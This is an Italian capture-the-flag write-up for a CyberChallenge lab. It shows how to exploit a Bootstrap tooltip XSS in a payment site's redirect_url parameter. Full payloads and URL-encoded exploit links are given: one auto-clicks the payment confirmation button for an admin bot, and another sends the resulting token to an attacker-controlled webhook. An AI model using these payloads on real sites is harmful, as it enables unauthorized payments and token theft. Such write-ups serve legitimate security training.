Abbiamo due siti:

1. **Flagify** (flagify-2.challs.cyberchallenge.it): Un e-commerce
    - La flag costa **100$**.
    - Noi abbiamo solo **5$**
2. **Payflag** (payflag-2.challs.cyberchallenge.it)
    - Quando creiamo un account, riceviamo **10$** gratuiti.
    - Abbiamo anche una pagina di report dove l’admin bot può visitare i link che gli inviamo tramite e ha **soldi infiniti**.

L’obiettivo è quello di convincere l’admin bot a comprare la flag per noi e ottenere il token di pagamento per riscattarla.

Quando clicchiamo su **“BUY WITH PAYFLAG”**, succedono questi passaggi:

1. **Flagify** ci reindirizza a Payflag con un link simile a questo:
    
    ```
    http://payflag-2.challs.cyberchallenge.it/pay?token=<TOKEN>&redirect_url=http://flagify-2.challs.cyberchallenge.it/callback
    ```
    
    dove
    
    - <TOKEN> è il token di pagamento per quell’acquisto.
    - redirect_url è l’URL dove verremo reindirizzati dopo il pagamento.
2. **Payflag** ci chiede conferma per completare il pagamento.
3. Se clicchiamo **“YES”**, viene eseguita una richiesta POST.
    
    ![Screenshot 2025-03-04 alle 08.52.31.png](attachment:5e42eb18-d3c6-43f6-b101-6e6929f3a7ed:Screenshot_2025-03-04_alle_08.52.31.png)
    
4. Dopo il pagamento, veniamo reindirizzati a Flagify con il token di conferma.

**Problema:**

- L’admin bot può visitare i link, ma farà solo **richieste GET**.
- Per completare un pagamento serve una **richiesta POST** → Dobbiamo sfruttare un XSS per farlo automaticamente.

**Sfruttare una Vulnerabilità XSS**

Il sito ha una protezione CSP rigorosa, ma nel codice della pagina troviamo Bootstrap Tooltip, che è vulnerabile a XSS.

![Screenshot 2025-03-04 alle 08.57.50.png](attachment:30140a81-3da2-4602-93ff-c627d4093fe4:Screenshot_2025-03-04_alle_08.57.50.png)

**Il parametro redirect_url è vulnerabile a XSS**.

Se modifichiamo redirect_url, il suo contenuto viene eseguito come HTML/JavaScript nella pagina di autorizzazione. Ad esempio se inseriamo il payload

```jsx
<input autofocus data-toggle="tooltip" data-html="true" title='<script>alert(1)</script>'/>
```

![Screenshot 2025-03-04 alle 08.58.53.png](attachment:e7747635-3e39-46b5-b01e-dee4981e1264:Screenshot_2025-03-04_alle_08.58.53.png)

Possiamo inserire un payload che **simula il click del bot sul pulsante “YES”** e completa il pagamento.

Modifichiamo il link di pagamento e cambiamo redirect_url con questo payload:

```
<input autofocus data-toggle="tooltip" data-html="true" title='<script>document.getElementsByClassName("btn")[0].click()</script>'/>
```

autofocus fa sì che il codice venga eseguito subito.

document.getElementsByClassName("btn")[0].click() clicca automaticamente il pulsante “YES”.

Dobbiamo prendere il link di pagamento originale e **sostituire** il redirect_url con il nostro payload **URL encoded**:

```
http://payflag-2.challs.cyberchallenge.it/pay?token=<TOKEN>&redirect_url=%3Cinput%20autofocus%20data-toggle%3D%22tooltip%22%20data-html%3D%22true%22%20title%3D%27%3Cscript%3Edocument.getElementsByClassName%28%22btn%22%29%5B0%5D.click%28%29%3C%2Fscript%3E%27%2F%3E
```

Ora dobbiamo far visitare questo link all’admin bot tramite la pagina **Report** su Payflag.

L’admin bot aprirà il link e, grazie al nostro **XSS**, cliccherà automaticamente su **“YES”**, confermando il pagamento della flag

**Recuperare il Token di Conferma**

Ora il pagamento è stato effettuato, ma dobbiamo ottenere il token di conferma per riscattare la flag.

Dopo il pagamento, il bot viene reindirizzato a redirect_url, quindi dobbiamo intercettare quella richiesta.

Usiamo un server controllato da noi per catturare il token.

Dobbiamo cambiare redirect_url in modo che il bot invii il token a un webhook controllato da noi.

Ora modifichiamo il link finale così:

```
http://payflag-2.challs.cyberchallenge.it/pay?token=<TOKEN>&redirect_url=https://mio-webhook.com/%3Cinput%20autofocus%20data-toggle%3D%22tooltip%22%20data-html%3D%22true%22%20title%3D%27%3Cscript%3Edocument.getElementsByClassName%28%22btn%22%29%5B0%5D.click%28%29%3C%2Fscript%3E%27%2F%3E
```

Quindi

1. L’admin bot visita il link e conferma il pagamento.
2. Dopo il pagamento, viene reindirizzato al nostro server.
3. Nei log del server, vedremo un URL che contiene il token di conferma.

Ora che abbiamo ottenuto il token di conferma, lo usiamo per riscattare la flag.

```
http://flagify-2.challs.cyberchallenge.it/callback?token=<TOKEN>
```